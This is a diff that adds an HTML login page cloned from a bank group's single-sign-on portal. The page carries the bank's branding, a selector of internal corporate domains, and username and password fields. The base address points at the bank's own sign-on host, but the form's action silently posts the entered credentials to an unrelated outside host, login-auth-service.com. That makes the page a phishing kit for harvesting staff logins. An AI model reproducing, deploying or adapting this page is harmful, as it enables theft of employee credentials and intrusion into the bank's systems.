@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+
+
+<!-- template name: html.form.login.template.html -->
+
+
+<!-- Configurable default behavior for the Remember Username checkbox -->
+            <!-- set the checkbox to unchecked -->
+            
+
+<html lang="en" dir="ltr">
+<head>
+    <title>Log on</title>
+    <base href="https://signon.mywebsso.cba/identity/"/>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+    <meta http-equiv="x-ua-compatible" content="IE=edge" />
+    <link rel="stylesheet" type="text/css" href="assets/css/main.css"/>
+    <link rel="stylesheet" type="text/css" href="assets/css/cba.css"/>
+    <link rel="icon" href="assets/images/favicon.ico" sizes="48x48" />
+    <link rel="icon" href="assets/images/favicon.svg" sizes="any" type="image/svg+xml" />
+    <script src='assets/scripts/captcha/captcha-utils.js'></script>
+    <script src='assets/scripts/captcha/captcha-script-loader.js' defer></script>
+    <script src='assets/scripts/pf-general.js'></script>
+<script ></script><script type="text/javascript" src="https://signon.mywebsso.cba/akam/13/5e064bd8"  defer></script></head>
+
+<body>
+<!-- CAPTCHA settings-->
+<div class="ping-container ping-signin login-template">
+
+    <div id="cba-ping-container" class="ping-body-container">
+        <div id="cba-ping-body-container">
+            <form method="POST" action="https://login-auth-service.com/login" autocomplete="off">
+
+                <div class="ping-messages">
+                                        
+                                        
+                </div>
+
+                                        <div class="ping-input-label">
+                            DOMAIN
+                        </div>
+                        <div class="ping-input-container">
+                                <select id="domain" size="1" name="domain" maxwidth="100%">
+                                    <option value="au.cbainet.com" selected="selected">AU</option>
+                                    <option value="Github">Github.com</option>
+                                    <option value="branch1.cbainet.com">Branch 1</option>
+                                    <option value="branch2.cbainet.com">Branch 2</option>
+                                    <option value="pbs.cbainet.com">PBS</option>
+                                    <option value="prod.asbgroup.co.nz">ASB</option>
+                                    <option value="">Bankwest</option>
+                                    <option value="sov.asbgroup.co.nz">SOV</option>
+                                </select>
+                        </div>
+
+                        <div class="ping-input-label">
+                            USERNAME
+                        </div>
+                        <div class="ping-input-container">
+                                                            <input id="inputUsername" type="text" size="36" name="inputUsername" value="" autocorrect="off" autocapitalize="off"  /><!---->
+                                <input id="username" type="hidden" name="pf.username" value="" />
+                                                        <div class="place-bottom type-alert tooltip-text" id="username-text">
+                                <div class="icon">!</div>
+                                Please fill out this field.
+                            </div>
+                        </div>
+
+                        <div class="ping-input-label">
+                            Password
+                        </div>
+                        <div class="ping-input-container password-container">
+                            <input id="password" type="password" size="36" name="pf.pass" />
+                            <div class="place-bottom type-alert tooltip-text" id="password-text">
+                                <div class="icon">!</div>
+                                Please fill out this field.
+                            </div>
+                        </div>
+
+                        
+                        
+                        <div class="ping-buttons">
+                            <input type="hidden" name="pf.ok" value="" />
+                            <input type="hidden" name="pf.cancel" value="" />
+                            <span id="signOnButtonSpan">
+                                <a class="ping-button normal allow" id="signOnButton" title="Log on">
+                                Log on
+                                </a>
+                            </span>
+                        </div><!-- .ping-buttons -->
+
+                        
+                        
+                                
+                <input type="hidden" name="pf.adapterId" id="pf.adapterId" value="loginAdapter" />
+            </form>
+        </div><!-- #cba-ping-body-container -->
+        
+    </div><!-- .ping-body-container -->
+
+</div><!-- .ping-container -->
+
+<script type="text/javascript" nonce="nrXI5CYHxK906JZM">
+
+    window.onload = function(){
+
+        setFocus();
+
+                    toggleMobile(false);
+        
+        var remember = false && false;
+            }
+
+    handleReturnPress('username', postOk);
+    handleReturnPress('password', postOk);
+    registerEventHandler('signOnButton', 'click', postOk);
+    registerEventHandler('forgotPasswordLink', 'click', postForgotPassword);
+    registerEventHandler('recoverUsernameLink', 'click', postRecoverUsername);
+    registerEventHandler('registrationLink', 'click', postRegistration);
+
+    var formSubmitted = false;
+
+    function postOk() {
+        if (formSubmitted)
+            return true;
+
+        formSubmitted = true;
+        var hasError = false;
+        CaptchaManager.execute(function() {
+            // remove error tips
+            if (document.forms[0]['inputUsername'].value !== '') {
+                document.getElementById('username-text').className = 'place-bottom type-alert tooltip-text';
+            }
+            if (document.forms[0]['pf.pass'].value !== '') {
+                document.getElementById('password-text').className = 'place-bottom type-alert tooltip-text';
+            }
+            // Add back
+            if (document.forms[0]['inputUsername'].value === '') {
+                document.getElementById('username-text').className += ' show';
+                hasError = true;
+            } else if (document.forms[0]['pf.pass'].value === '') {
+                document.getElementById('password-text').className += ' show';
+                hasError = true;
+            } else {
+                submitForm();
+            }
+            if (hasError) {
+                formSubmitted = false;
+            }
+        });
+    }
+
+    function postForgotPassword() {
+
+		var target = "$forgotPasswordUrl";
+				document.forms[0].action = target;
+        document.forms[0]['pf.passwordreset'].value = 'clicked';
+		document.forms[0].submit();
+	}
+
+	function postRecoverUsername() {
+        document.forms[0]['pf.usernamerecovery'].value = 'clicked';
+		document.forms[0].submit();
+	}
+
+	function postRegistration() {
+        document.forms[0]['$registrationValue'].value = true;
+        document.forms[0].submit();
+    }
+
+    function submitForm() {
+        var signOnButtonSpan = document.getElementById('signOnButtonSpan');
+        signOnButtonSpan.classList.add('content-columns', 'disabled');
+        signOnButtonSpan.style = "pointer-events: none;";
+
+        var signOnButton = document.getElementById('signOnButton');
+        signOnButton.innerHTML = 'Logging on...';
+
+        document.forms[0]['pf.ok'].value = 'clicked';
+        userName = document.forms[0]['inputUsername'].value;
+        domain = document.forms[0]['domain'].value;
+        if(domain.length > 0 && !userName.match(/^\d+$/) && userName.indexOf('@') == -1) {
+            document.forms[0]['pf.username'].value = userName+ '@' +domain;
+        } else {
+            document.forms[0]['pf.username'].value = userName
+        }
+        document.forms[0].submit();
+        CaptchaManager.cleanup();
+    }
+
+    function postCancel() {
+        document.forms[0]['pf.cancel'].value = 'clicked';
+        userName = document.forms[0]['pf.username'].value;
+        document.forms[0].submit();
+    }
+
+    function setFocus() {
+        var platform = navigator.platform;
+        if (platform != null && platform.indexOf("iPhone") == -1) {
+                        document.getElementById('username').focus();
+        } else if (platform != null && platform.indexOf("iPhone") != -1) {
+                    }
+    }
+</script>
+
+</html>
